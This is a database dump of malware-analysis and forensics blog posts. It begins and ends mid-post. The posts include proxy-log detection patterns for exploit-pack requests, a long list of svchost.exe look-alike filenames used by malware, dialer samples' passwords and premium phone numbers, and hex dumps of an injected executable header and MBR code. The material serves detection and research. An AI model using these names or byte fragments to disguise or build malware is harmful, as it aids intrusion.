\r\n}\nLoading such applet leads to the following traffic being observed:\nWell, there you have it: requests to:\n\n/com.class\n/edu.class\n/net.class\n/org.class\n\nappear when we instantiate the JavaScript engine via ScriptEngineManager.\nThis below is just a guess (I don’t know Rhino source code and architecture at all), but looking at the source code the activity seems to be triggered by the following snippets (if anyone can confirm it, please let me know, thanks!):\n\nsrc\\org\\mozilla\\javascript\\ScriptRuntime.java\n\n             static String[] getTopPackageNames() {\r\n        // Include \"android\" top package if running on Android\r\n        return \"Dalvik\".equals(System.getProperty(\"java.vm.name\")) ?\r\n            new String[] { \"java\", \"javax\", \"org\", \"com\", \"edu\", \"net\", \"android\" } :\r\n            new String[] { \"java\", \"javax\", \"org\", \"com\", \"edu\", \"net\" };\r\n    } \r\n[...]\n   for (String packageName : getTopPackageNames()) {\r\n            new LazilyLoadedCtor(scope, packageName,\r\n                    \"org.mozilla.javascript.NativeJavaTopPackage\", sealed, true);\r\n        }\nHow can we use this data?\nI personally came up with a few ideas, which I was directly utilizing to enhance the defenses of the org I was protecting – all of them relied on knowing the  new paths / file name patterns used by exploit packs. These change often and keeping ahead of the curve allows us to:\n\nDefine regular expressions or static patterns for proxy logs block / alerts (can be also added to SIEM if you use it for proxy log analysis)\nSearch online and find actual domain names using these – if done manually this is a very tedious job, but can be automated – these can be blocked as well\nFind actual new malware samples for submitting to AV (malicious web sites sometimes don’t protect against directory listing and knowing a specific file name makes it possible to find the full repository of new malware samples)\n\nThere are probably more ideas possible.\nShare this :)', 'Forensic Analysis, Malware Analysis, Proxy Logs Analysis', 'http://www.hexacorn.com/blog/2013/07/09/java-y-u-haz-no-class-proxy-logs-patterns-class-class-com-class-edu-class-net-class-org-class/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (306, 'Permanent Link to The argument about /prefetch:X, or … the other way around', 'Hexacorn', 'July 6, 2013 ', 'My older posts about the algorithm used by Prefetch files mentioned the /prefetch:X command line argument, but I never got a chance to explain this in detail. Today I accidentally came across an old post on MSDN that goes to a great extent explaining this bit. As per the blog:\nThe /prefetch:# flag is looked at by the OS when we create the process — however, it has one (and only one) purpose.  We add the passed number to the hash.  Why?  WMP is a multipurpose application and may do many different things.  The DLLs and code that it touches will be very different when playing a WMV than when playing a DVD, or when ripping a CD, or when listening to a Shoutcast stream, or any of the other things that WMP can do.  If we only had one hash for WMP, then the prefetch would only be correct for one such use.  Having incorrect prefetch data would not be a fatal error — it’d just load pages into memory that’d never get used, and then get swapped back out to disk as soon as possible.  Still, it’s counterproductive.  By specifying a /prefetch:# flag with a different number for each “mode” that WMP can do, each mode gets its own separate hash file, and thus we properly prefetch.  (This behavior isn’t specific to WMP — it does the same for any app.)\nIsn’t that great when we don’t need to reinvent the wheel? \nStill, at the bottom of the article it says:\n(ATTENTION: This is merely an informative article; this information is completely unsupported, and the functionality may change or disappear entirely in future versions of Windows or service packs.  Furthermore, it is merely a hint for the XP prefetcher, and it may choose to ignore it if it wishes.)\nOh well.. most of the forensic analysis is based on the ‘undocumented’ ‘unsupported’ and guesswork anyway, so it kinda fits in perfectly \nShare this :)', 'Forensic Analysis', 'http://www.hexacorn.com/blog/2013/07/06/the-argument-about-prefetchx-or-the-other-way-around/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (307, 'Permanent Link to The typographical and homomorphic abuse of svchost.exe', 'Hexacorn', 'July 4, 2013 ', 'Update\nI have re-visited this topic here.\nOld post\nProbably the most abused file name in the history of a mankind is svchost.exe. The number of its look-alike variations created by the perverse mind and deprived imagination of malware authors is staggering.\nThe following list is a testament to… oh, whatever…  it’s just a few examples extracted from a list of IOCs \n\nsvchost\nsvch0st\nsvchosts\nscvhost\nsvhost\nsvohost\nsvchest\nsvchost32\nsuchost\nsvshost\nsvchast\nsvcnost\nsyshost\nsvchcst\nsvchost\nsvchon32\nsvchost2\nsvcchost\nsxhost\nsvchost31\nsyschost\nsvchîst\nsynchost\nsvchpst\nsvohcst\nsvghost\nsvchostms\nsvchostxxx\nsuchostp\nsuchosts\nsmsvchost\nsvcehost\nsvphost\nsvchostdll\nsvvhosti\nsach0st\nswchost\nservehost\nsvsh0st\nsvchsot\nscchostc\nsnvhost\nscchost\nsvvhost\nsvahost\nsvcinit\nssvch0st\nsvchots\nsvdhost\nsvchostv\nscvchusts\nsvchostxi\nst#host\nsvchost3\nscanost\nschosts\nsvchost0\nsvchost64\nsvchöst\ns_host\nsvchost”\nsvphostu\nsvchostc32\nszchostc\nsvehost\nsrvchost\nsvchosts32\nscvhosv\nssvichosst\nsvrhost\nsvichosst\nsvchoxt\nsvchost_cz\nschost\nssvchost\nsv±hest\nshhost\nsvchostt\nsvchosf\nsvchostþ\nsachostp\nsachosts\nsachostx\nswhost\nscvh0st\nsvcroot\nsvschost\nsvchosting\nsachostc\nsachostw\nsvshoct\n\n \nShare this :)', 'Batch Analysis, Malware Analysis, Silly', 'http://www.hexacorn.com/blog/2013/07/04/the-typographical-and-homomorphic-abuse-of-svchost-exe/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (308, 'Permanent Link to Dialers – Under a Magnifying err… Prism', 'Hexacorn', 'June 17, 2013 ', 'Last weekend I err.. prismed a small collection of dialer samples to test if I can automatically extract RAS dialup connection properties from this old school malware. The results were not mind blowing, but dropping it here in case someone finds it useful.\nWhat I found interesting was that the passwords often seemed to be supertrivial and countries I have identified using prefixes listed on wikipedia appear to include quite a few exotic places:\n\n+239 – São_Tomé_and_Príncipe\n+246 – British Indian Ocean Territory\n+31 – The Netherlands\n+372 – Estonia\n+423 – Liechtenstein\n+453 – Denmark\n+56 – Chile\n+675 – Papua New Guinea\n+677 – Solomon Islands\n+678 – Vanuatu\n+681 – Wallis and Futuna\n+682 – Cook Islands\n+683 – Niue\n+850 – North Korea\n\nTwo prefixes seem to be country-independent:\n\n+881-9 – Globalstar\n+882-13 – Telespazio\n\nand a few numbers which I can’t attribute – they seem to be either mobile phones, or some country-specific premium lines… I guess the best way to check is to just… dial them \nList of Unique Passwords used in RAS dialup connections:\n\np033052172\npremium\npassword\n7309\nSE899\nsh095z3ma\noxt145uks2ma\nfpdz5s1ma\nimport\nwelcomein\ncolor\nah12M\n4592\nx\nradius\npass\nguest\nnocard\ntronyx\ntyra\nsmart\n1234\nxxx\nnewDialer\nall4world\nConnInt1\n\nList of Unique Phone Numbers used in RAS dialup connections:\n\n0,00881939110003\n0,00881939110004\n0,00881939110005\n0,899015708\n0,899015716\n00239203533\n002463535445\n002467323\n0031620101356\n0037254111251\n0037254111455\n003727032150\n00423663098495\n004535293061\n0056111488\n0056113680\n0056113681\n005688800000\n006753039093\n0067746160\n0067867861\n00681507747\n00681729173\n0068246802\n006831423\n0085099721002\n00881939100020\n00881939100038\n00881939100039\n00881939110003\n00881939110004\n00881939110005\n0088213881692\n01367867861\n019008496713\n08718731247\n09062001830\n09062658623\n09065170091\n09065170092\n09090272201\n09090272203\n09099629050\n10330016646641055\n1661 43309\n1782072027\n1782072028\n1782072030\n1782072035\n1782072039\n199317770\n199317771\n199317772\n199317773\n7090101101\n7090101121\n7090101603\n89230362\n899001594\n899015339\n899015708\n899015716\n899020117\n899020120\n899020335\n899111301\n899111302\n899151401\n899151602,,02014812497309\n899151602,,02014860614592\n899161006,,,0881171482733\n899191028\n899191420\n899550532\n899550533\n899554573\n899999583\n899999594\n976702233\n976702236\nT0031620101409\nT087847249\nT899161336\n\nList of Unique Connection Names used in RAS dialup connections:\n\namstercam italia\nAXIS\nBest Porn Network\nconnection\nconnessione Predefinita\nCsex1\ndefault\ndesktop-celebrita\ndesktop01\nDIDI\ndMi_77_Connection\nENTER\ngsa1002_Connection\ngsa_01746_Connection\nHelp and Internet\nInternet Connectio\nInternet Connection\nInternet…\nkaraokex31_Connection\nkaraokex_4_Connection\nLaunch DerBiz.com\nnd02191_Connection\nnocard210\nnocard2101\nnocard21012\nnocard210123\nnocard260\nnocard2601\nnocard26012\nnocard260123\nPorn Access Connection\nSIXA\ntest\ntyra210\ntyra2101\ntyra21012\ntyra210123\nUnNet\nVideo\nwestat1x_Connection\nwladesk74x_Connection\nwmdtips24x_Connection\nwww_bau\n\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2013/06/17/dialers-under-a-magnifying-err-prism/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (309, 'Permanent Link to “Malicious” Magic Squares', 'Hexacorn', 'June 11, 2013 ', 'Update\nFound one more \n   L   I   S   T   A   S\r\n   I   M   P   O   R   T\r\n   S   P   U   L   E   R\r\n   T   O   L   O   S   E\r\n   A   R   E   S   E   S\r\n   S   T   R   E   S   S\nOld post\nAs a kid I loved to solve cross-words, I also published my own (together with various riddles).\nI was very fond especially of magic squares e.g. a classic one:\nS     A     T     O     R\r\nA     R     E     P     O\r\nT     E     N     E     T\r\nO     P     E     R     A\r\nR     O     T     A     S\nand palindromes e.g.\nmalayalam\nand anything that would be a bit unusual (e.g. 7-letter words with 4 As, partially overlapping words, etc.).\nWhen I learned programming I wrote various cross-word generators including one for magic squares.\nFinding magic squares is very easy for 3-, 4-, 5- letters. It gets a bit more challenging with 6-, but it’s still quite easy and it gets really tough with 7-, 8-, 9- letters.\nHaving nothing else to do, today I tried to see how my old code would perform taking a small database of malware-related keywords as a base. To my surprise, it actually found a few magic squares for 6 characters!\nHere they are:\nG   A   G   G   L   E\r\nA   P   R   O   O   L\r\nG   R   O   O   V   E\r\nG   O   O   B   E   R\r\nL   O   V   E   N   A\r\nE   L   E   R   A   D\r\n\r\nH   A   L   E   S   S\r\nA   T   O   M   I   C\r\nL   O   O   P   E   R\r\nE   M   P   I   R   E\r\nS   I   E   R   R   A\r\nS   C   R   E   A   M\r\n\r\nI   S   T   B   A   R\r\nS   P   A   R   S   E\r\nT   A   R   A   P   A\r\nB   R   A   B   A   N\r\nA   S   P   A   D   E\r\nR   E   A   N   E   T\nIf you google these words, you will find out that all of them are actual names of a malware.\nBonus\nHow often do you see a code like this nowadays? Addressing via seg:ofs was a real pain in a 16-bit real-mode \n               xor dx,dx\r\n               mov ax,word ptr fs:[si]\r\n               add ax,ax\r\n               adc dx,0\r\n               add ax,ax\r\n               adc dx,0\r\n               shl dx,12\r\n               add dx,CS:DSegm0\r\n               mov es,dx\r\n               mov bx,ax\r\n\r\n              [...]\nShare this :)', 'Hackme/crackme, Others, Silly', 'http://www.hexacorn.com/blog/2013/06/11/malicious-magic-squares/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (310, 'Permanent Link to Clustering and Advanced/In-depth Malware Analysis with HexDive Pro', 'Hexacorn', 'June 6, 2013 ', 'A few months ago I introduced a new tool called HexDive. The tool speeds up analysis of strings that are extracted from portable executable files (PE). It does it by showing only these strings that are the most relevant from a malware analysis perspective.\nStrings extracted directly from a PE file have certainly some value, but it’s limited by many factors including:\n\nCompression (code and/or data is decompressed only when program is executed)\nEncryption (code and/or data is decrypted only when program is executed)\nObfuscation (code and/or data are hidden between a lot of junk code and data)\nWrapping (code and/or data is hidden deep inside the file and ‘unwrapped’ only when program is executed)\nDynamic code loading (code injects, shellcodes that may be hidden using techniques described above)\nThe environment (code and/or data is not a part of the malware itself, but is extracted from the system on which it is executed)\nThe nature of run-time (code and data seen depends on the environment and code branches inside the malware)\nAnti- tricks (what we see depends heavily on malware’s ability to detect it is running inside the sandbox, or under monitoring tools e.g. debugger)\n\nTo address this, HexDive Pro takes analysis to the next level and allows to extract many run-time artifacts produced by a running program.\nThis includes:\n\nAPI calls and their parameters\nHex dumps and Strings extracted from buffers allocated during the run-time (including stack)\nCode Injects and shellcodes\nWrapped code\nScreenshots of all windows\nVery specific features of the malware that can help to uniquely identify it\nand it can do a few other things that I will keep secret at the moment, but will reveal in next posts \n\nTo demonstrate what HexDive Pro can do, all I have to do is to provide a reference to what I posted in last few months.\nIn fact, most of the clustering, batch analysis and malware analysis posts were heavily influenced by results provided by HexDive Pro. The results the tool provided thus far helped me to:\n\n… discover the hidden code inside ZeroAccess\n… cluster ZeroAccess samples I have in my collection to find out which contain code using Extended Attributes (NTFS) and to create a list of all known EA names used by this malware\n… cluster APT sampleset in many ways.\n… instantly discover strings in Flame malware\nand others, more or less influenced by it (including various statistics)\n\nThe results of these experiments helped me a lot to tweak the code so that it is as useful as possible.\nOn the surface, HexDive Pro is working like a typical API monitor – running malware under its control and using various tricks to intercept traces of its execution. Going deeper, it combines best pieces of Application Monitor, Hex Dive, HMFT, Hstrings and also leverages information from numerous databases of artifacts (both static and dynamic) I gathered over the years of malware analysis.\nAll of these combined efforts produce a tool that makes it possible to gain an in-depth knowledge about the analyzed malware within 30-180 seconds.\nIn fact, the APT1 clustering data I posted here has been generated pretty quickly using HexDive Pro. The results posted were just a tip of the iceberg as the output contained all the juice one can extract manually only after hours of painstaking analysis. If you multiply it by a number of samples, the performance gain is tremendous.\nAnyone who does malware analysis professionally knows how tedious in-depth analysis can be. Anyone who doesn’t, is forced to rely on writeups written by the antivirus companies, peers’ help and search engines.\nWith HexDive Pro you will be able to often learn more about malware than you can read online, you will be also able to verify what you read in AV writeups. On occasion, the tool will also miserably fail which could mean that you have stumbled upon a new trick  to inject code, new trick to escape tracing, or new 0day that helps the malware to run free. Or there may be a bug.\nSuch is a life of software like this \nLast, but not least – the audience for the tool are:\n\nForensic investigators who don’t have malware analysis skills.\nBeginners and intermediate level malware analysts.\nAnyone who wants to do batch analysis and clustering of their samplesets.\nAnyone who wants to analyze not only malware, but any Windows software (32-bit only); the tool provides in-depth look into internals working of the software applications and may be useful in security/vulnerability assessments.\nHardcore malware analysts may benefit from the tool as well, but they probably already have adequate or better private tools on their own.\n\nI have tested it extensively and since it’s a private tool that evolved from a few API monitors I wrote in the past, as well as many other tools/scripts I have written and finally my own experience doing in-depth malware analysis I have a hope it will be useful for the community.\nThe first version is coming soon. Stay tuned!\nNote: The software will be available commercially only.\nSome more examples\nThe following artifacts are extracted instantly:\n\nList of API extracted during run-time:\n\nGets Procedure Address: WS2_32.dll, accept\nGets Procedure Address: WS2_32.dll, bind\nGets Procedure Address: WS2_32.dll, closesocket\nGets Procedure Address: WS2_32.dll, connect\nGets Procedure Address: WS2_32.dll, getpeername\nGets Procedure Address: WS2_32.dll, getsockname\nGets Procedure Address: WS2_32.dll, getsockopt\n…\n\n\nUser agents used by malware\nInformation about stealing capabilities of malware (e.g. targeted applications)\nFiles that malware tries to find on the system (e.g. to actually run)\nVarious tricks to escape analysis/HIPS\nVarious tricks to detect monitoring tools\nAccess to PhysicalDevices (memory, drives) – usually bypassing HIPS and infecting MBR\nBuffers (read/written files, read/written memory, etc.)\n\nInjected/wrapped .exe\r\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 - MZ.............. \r\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 - ................ \r\n0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68 - ........!..L.!Th \r\n74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20 - t be run in DOS  \r\nD7 52 82 ED 93 33 EC BE 93 33 EC BE 93 33 EC BE - .R...3...3...3.. \r\n10 3B B0 BE 92 33 EC BE 1D 3B B3 BE 97 33 EC BE - .;...3...;...3.. \r\n52 69 63 68 93 33 EC BE 00 00 00 00 00 00 00 00 - Rich.3..........\r\n50 45 00 00 4C 01 06 00 01 A6 4A 46 00 00 00 00 - PE..L.....JF....\r\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 - ........@.......\r\n00 00 00 00 00 00 00 00 00 00 00 00 E0 00 00 00 - ................\r\n69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F - is program canno\r\n6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00 - mode....$.......\r\n10 3B B1 BE 94 33 EC BE 93 33 ED BE 8A 33 EC BE - .;...3...3...3..\r\n10 3B B2 BE 92 33 EC BE 10 3B B6 BE 92 33 EC BE - .;...3...;...3..\r\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 - ................\r\n00 00 00 00 E0 00 02 21 0B 01 05 0C 00 90 00 00 - .......!........\r\n                                               \r\nMBR code\r\n33 C0 8E D0 BC 00 7C FB 50 07 50 1F FC BE 1B 7C - 3.....|.P.P....|\r\n38 6E 00 7C 09 75 13 83 C5 10 E2 F4 CD 18 8B F5 - 8n.|.u..........\r\nF0 AC 3C 00 74 FC BB 07 00 B4 0E CD 10 EB F2 88 - ..<.t...........\r\n80 7E 04 0C 74 05 A0 B6 07 75 D2 80 46 02 06 83 - .~..t....u..F...\r\nBC 81 3E FE 7D 55 AA 74 0B 80 7E 10 00 74 C8 A0 - ..>.}U.t..~..t..\r\n00 B4 08 CD 13 72 23 8A C1 24 3F 98 8A DE 8A FC - .....r#..$?.....\r\n0A 77 23 72 05 39 46 08 73 1C B8 01 02 BB 00 7C - .w#r.9F.s......|\r\nBF 1B 06 50 57 B9 E5 01 F3 A4 CB BD BE 07 B1 04 - ...PW...........\r\n83 C6 10 49 74 19 38 2C 74 F6 A0 B5 07 B4 07 8B - ...It.8,t.......\r\n4E 10 E8 46 00 73 2A FE 46 10 80 7E 04 0B 74 0B - N..F.s*.F..~..t.\r\n46 08 06 83 56 0A 00 E8 21 00 73 05 A0 B6 07 EB - F...V...!.s.....\r\nB7 07 EB A9 8B FC 1E 57 8B F5 CB BF 05 00 8A 56 - .......W.......V\r\n43 F7 E3 8B D1 86 D6 B1 06 D2 EE 42 F7 E2 39 56 - C..........B..9V\r\n8B 4E 02 8B 56 00 CD 13 73 51 4F 74 4E 32 E4 8A - .N..V...sQOtN2..\nShare this :)', 'Batch Analysis, Forensic Analysis, HexDive Pro, Malware Analysis, Software Releases', 'http://www.hexacorn.com/blog/2013/06/06/clustering-and-advancedin-depth-malware-analysis-with-hexdive-pro/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (311, 'Permanent Link to The Hades haz you. Phantom (유령) – The DFIR drama from South Korea', 'Hexacorn', 'May 18, 2013 ', 'The way the movies portray hacking, forensics, security research and coding is obviously metaphoric and usually made as visually rich as possible to ensure the audience ‘gets it’ and as a bonus can see how cool the process is. Anyone who spent a few sleepless nights with Olly and Ida Pro, worked around the clock on forensic cases, reviewed vulnerability reports or source code, or worked in their head on a particular algorithm for a few weeks before actually sitting down and writing the code knows that the reality is a bit more boring \nIf you ask a random security pro what are ‘the best’ hacking movies they will surely laugh pointing out at least a few from the following list:\n\nHackers\nSwordfish\n ‘the Visual Basic’ episode of CSI\nThe Net (IP 23.75.345.200 \nThe Golden Eye\nSkyfall \nSocial Network\n\n..and perhaps at some stage they will suddenly become a bit more serious and mention that ‘but Matrix did show NMAP in action’.\nLuckily, there are actually movies out there that beat all the above mentioned productions in terms of technical accuracy, and show a relatively realistic representation of  IT security work.\nThis post is about one of them.\nA while ago I happened to stumble upon a Korean TV Drama called “Phantom” (also know as “Ghost“) that made my jaws drop. The drama was produced by a Korean Network SBS.\nThe plot of the drama is simple – The Hades haz you \n\nCopyright notice: The picture of Hades logo was taken from the clip on Youtube. The copyright belongs to SBS.\nOkay, the plot is a bit more complicated – it’s a “Face off” meet “Jason Bourne” meet CSI.\nOr\nEvil Hackers from Korea and Hong Kong vs. Forensic guys from Korean Police.\nSince it’s not IMDB, just a short note on the movie – I have already described bits of the plot; I don’t want to spoil it so I won’t add more information here. The music is all right. The acting is so so (the lead characters are a little bit too stiff and rarely smile). There are gaps in the story as well, but it’s a TV Drama after all, and it’s Korean so there is lots of melodrama ‘by default’. There is also a very strong product placement, but if this the only way to get funds to make TV dramas then so be it.\nOkay, back to ‘technical’ stuff.\nWhat makes this particular TV Drama stand out is the attention to details. While they didn’t completely escape typical Hollywood cliché (computers with the evidence are thrown out of the window, logic bombs with a progress bar, etc.) the makers really did their homework and put quite an effort to demonstrate how a typical hacking works. And how forensic guys investigate it.\nLots of scenes are taken in the forensic lab, or on the crime scene – in internet coffee shops, data centers, etc.. We also witness the actual data acquisition, evidence analysis (HDD, mobile, CCTV footage, video manipulation analysis, social media, Event Logs) and most importantly – lots of popular DFIR/RCE software is used to ‘understand’ the data and code. This is really not just a single random tool or a hand made HTML page that is supposed to look like ‘analysis results’. Quite the opposite – many of the most common tools from the DFIR/RCE/pentesting arsenal somehow found its way to the drama.\nThe software I remember seeing includes:\n\nEncase\nWinHex\nMetasploit\nOllyDbg\nDCode\nSecureCRT\nWireshark\nXRY\nBackTrack\nProcess Explorer\n\nand lots more (I wish I took notes!).\nLast, but not least – there are also realistic attacks being used as a part of the plot including, but not limited to:\n\n0Day exploits (using documents from Hangul Word Processor)\nmalware infections\nbillboard hacking\nspoofed emails\nidentity theft\nSCADA attacks\ncar hacking\nhacking back in real time\nDDoS attacks\nWi-Fi hacking\nsocial engineering\n\nand lo and behold – even STUXNET is mentioned!\nThumbs up South Korea!!!\nShare this :)', 'Others', 'http://www.hexacorn.com/blog/2013/05/18/the-hades-haz-you-phantom-%ec%9c%a0%eb%a0%b9-the-dfir-drama-from-south-korea/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (312, 'Permanent Link to UVWATAUAVAWH – Meet The Pushy String', 'Hexacorn', 'May 16, 2013 ', 'The title of this post is not a secret message and I am not intoxicated.\nUVWATAUAVAWH happens to be the most popular string extracted from all .exe, .dll and .sys OS files on my 64-bit Windows. The string is so popular and at the same time suspicious that if you google it you will find people theorizing about it having something to do with BSODs / being a part of some internal ZeroAccess secret language.\nIf you convert the characters into hex:\nUVWATAUAVAWH\nyou will get a string of bytes like these:\n55 56 57 41 54 41 55 41 56 41 57 48\nand these can be also represented as opcodes:\nU  - push    rbp\nV  - push    rsi\nW  - push    rdi\nAT - push    r12\nAU - push    r13\nAV - push    r14\nAW - push    r15\nH  - part of sub rsp, xxx opcode\nThe sequence is a very typical prologue for functions  (64-bit code) – so typical that it is all over the place together with its variants (see below); the ‘vowelized’ properties of these strings remind me an interesting paper about shellcodes that look like English text.\nUVWATAUAVAWH\r\nWATAUH\r\nWATAUAVAWH\r\nSUVWATAUAVAWH\r\nSUVWATH\r\nVWATAUAVH\r\nSUVWATAUH\r\nATAUAVH\r\nUSVWATAUAVAWH\r\nUVWATAUH\r\nSUVWATAUAVH\r\nSVWATAUAVAWH\r\nUSVWATH\r\nUSVWATAUH\r\nUSVWATAUAVH\r\nVWATAUAVAWH\r\nWAVAWH\r\nATAUAVAWH\r\nVWATAUAWH\r\nWATAVH\r\nUVWATAUAVH\n \nShare this :)', 'Batch Analysis, Malware Analysis, Silly', 'http://www.hexacorn.com/blog/2013/05/16/uvwatauavawh-meet-the-pushy-string/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (313, 'Permanent Link to …and the most popular day for malware compilation is:', 'Hexacorn', 'May 16, 2013 ', 'Saturday.\nThursdays, Fridays, Saturdays are the days when the malware is compiled the most often.\nIt kinda makes sense*.\nWho would like to work Sundays and Mondays?**\n\n*remember what they say about statistics  (data based on 2.5M samples)\n**obviously, the APT guys\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2013/05/16/and-the-most-popular-day-for-malware-compilation-is/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (314, 'Permanent Link to …and the most popular windows account for compiling malware is:', 'Hexacorn', 'May 8, 2013 ', 'Administrator.\nMany malware samples contain debug strings that include paths often directly pointing to a location where the source code is stored and so it happens that often it’s also a location under the USERPROFILE. For the fun of it, I extracted the strings from a large batch of samples and came up with the following statistics (showing top 50):\n   3893 Administrator\r\n   2963 JUANJO\r\n   1121 ryanch\r\n    928 Boy\r\n    617 UserXP\r\n    612 user\r\n    519 1337\r\n    502 User\r\n    465 Admin\r\n    435 root\r\n    422 bld4act\r\n    418 Owner\r\n    347 nosferatus\r\n    305 Administrateur\r\n    300 M4x\r\n    296 ismael\r\n    277 goga\r\n    277 Kyle\r\n    255 Mirko\r\n    247 1134\r\n    244 kdglkrkjdfhslej\r\n    241 FEDERIKO\r\n    234 t0fx\r\n    231 rstephens\r\n    219 DarkCoderSc\r\n    218 gcc\r\n    205 icyheart\r\n    200 Dave\r\n    197 michael\r\n    197 Roshan\r\n    197 James\r\n    195 Ben\r\n    182 John\r\n    178 admin\r\n    173 Dev\r\n    161 box1\r\n    157 nonadmin\r\n    153 FELIPE\r\n    152 Familie\r\n    151 Timothy\r\n    137 Dhivin\r\n    133 Vortex\r\n    131 Robert\r\n    130 dabdoub\r\n    129 USER\r\n    127 dr zinou\r\n    125 packar\r\n    122 David\r\n    116 nathu\r\n    116 Daniel\nIt’s obviously biased.\nOther interesting names include:\n\ntom age five\nGANGSTA\nKrusty the Clown\n^_^\nItchyFingerz\nirishboy\nromantic\nlol\nbrad pitt\nLove Bebe\nLorD^^$$steal3R\nCyber-Warrior Ender\nauchan\nF-B-I\nValued Sony Customer\nSexyReplay\nMicrosoft\nPoo\nTrojan\nP@wn3d\nEmperor Zhou Tai Nu\n\nThere are over 7000 account names on the list. If you want the full list, please contact me offline.\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2013/05/08/and-the-most-popular-windows-account-for-compiling-malware-is/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (315, 'Permanent Link to JumpLists file names and AppID calculator', 'Hexacorn', 'April 30, 2013 ', 'JumpList files are an interesting forensic artifact and as such they have been thoroughly explored by many researchers over last 2-3 years. There is really a lot of material out there and there are also many tools that parse JumpList files’ structure quite well. This is why in this post I will focus not on the content of JumpList files, but on their… file names.\nAlgorithm\nThe JumpList file names are created using hash-like values that in turn are based on something that is called AppID. The Forensics Wiki lists many known Jump List file names based on AppIDs; examples include:\n\n\n918e0ecb43d17e23 used by Notepad (32-bit)\n9b9cdc69c1c24e2b used by Notepad (64-bit)\n1bc392b8e104a00e used by Remote Desktop\n\nand so on and so forth. The data from Forensics Wiki has been harvested from many sources and it’s a very useful reference for further research.\nThe algorithm to create a hash-like value is actually ‘sort of known’. There are posts out there suggesting that the AppID is a nothing but a CRC64 sum taken from the application path. For example, in this post, an Anonymous poster provided a Hexrays Decompiler’s code snapshot taken from shell32.dll showing how the AppID is generated. When I came across this particular comment I decided to verify it. I applied CRC64 sum to an example path and compared it with an expected known file name, and since you are reading this post you are probably guessing that it failed miserably \nOkay, so since it failed and since the algorithm didn’t t seem to be explored in-depth yet I thought I will give it a go. It turned out to be quite simple, but there were a few challenges on the way that may be interesting to know about so I describe it below. I also ended up writing a perl script that I called AppID calculator (appid_calc.pl). It allows you to calculate an AppID based on provided string – more about it below as well. You can find a download link to the script at the bottom of this post.\nChallenges\nUsing the code snippet I referred to earlier as a guidance, I quickly found the code responsible for generating AppIDs, put the appropriate breakpoints in a debugger, and.. immediately understood why the CRC64 (path) didn’t work for me earlier \nThe CRC64 algorithm has been indeed applied to a path, but there are a few quirks:\n\nThe path is first converted to Unicode\nIf the path is located in one of locations that are recognized and treated by system in a special way, the path is normalized first\nThe CRC64(Path) algorithm applies only to AppIDs automatically generated by the system; At any point of time any application can change its AppID either using the SetCurrentProcessExplicitAppUserModelID API, or can even apply window-specific AppID using  IPropertyStore::SetValue to change the PKEY_AppUserModel_ID property of  the particular window\nOn top of that, the CRC64 uses a non-standard polynomial\n\nFirst, let’s talk about the CRC64. There are many CRC algorithms out there. In fact, the difference is not only between the length in bits (CRC16, CRC32, CRC64), but also in the configuration of a particular implementation. There are obviously many standard configurations (Wikipedia described quite a few), but the one used in AppID generation is not on the standard list. I know, because the very first thing I tried was to use all standard configurations, but all of them failed :-).\nThe actual code used by the system relies on a precalculated lookup table, but googling around for the numbers from the table only brought 2-3 hits. In such case, the usual way of solving the issue is to rip the code from the source and reimplement it e.g. in perl.  This could be done easily. The 2-3 hits I mentioned earlier refer to a code that was created as a result of reverse engineering of thumbcache.dll  file – turns out that the very exact CRC64 configuration/implementation has been used in that DLL.\nExploring the properties of CRC I eventually managed to deduce the CRC configuration and the actual polynomial used to generate the lookup table.\nThe polynomial used by the AppID algorithm is 0x92C64265D32139A4.\nOnce I found out I went to google again and this time I also got 2-3 hits only. First two were on the Thumb Cache-related code I already mentioned. The last one was the Microsoft page describing the use of this particular polynomial in a ADSStreamHeader structure:\nCrc (8 bytes): A bit-reversed CRC-64 hash of the FCIADS stream from the TimeStamp field to the end of the structure that can be used to validate the integrity of the FCIADS stream. The cyclic redundancy check (CRC) polynomial is x**64 + x**61 + x**58 + x**56 + x**55 + x**52 + x**51 + x**50 + x**47 + x**42 + x**39 + x**38 + x**35 + x**33 + x**32 + x**31 + x**29 + x**26 + x**25 + x**22 + x**17 + x**14 + x**13 + x**9 + x**8 + x**6 + x**3 + 1, with the leading 1 implied. The normal representation is 0x92C64265D32139A4.\nThat was a good sign and I could now start implementing the appid calculator w/o ripping the lookup tables.\nThe second issue to solve was the normalization.  The paths are normalized using KNOWNFOLDERIDs, so it’s a simple search and replace before applying the CRC.\nOne aspect of normalization I need to mention is… ambiguity. Depending on the OS (32 vs. 64 bit) different KNOWNFOLDERIDs are applied during the normalization path and it’s quite confusing. I suggest reading the Microsoft page I linked to above for further details.\nLast, but not least. – quite a lot applications use SetCurrentProcessExplicitAppUserModelID API to change their AppID after they are executed. For example, the following applications do it (AppID – application name):\n\nMicrosoft.Silverlight.Offline – 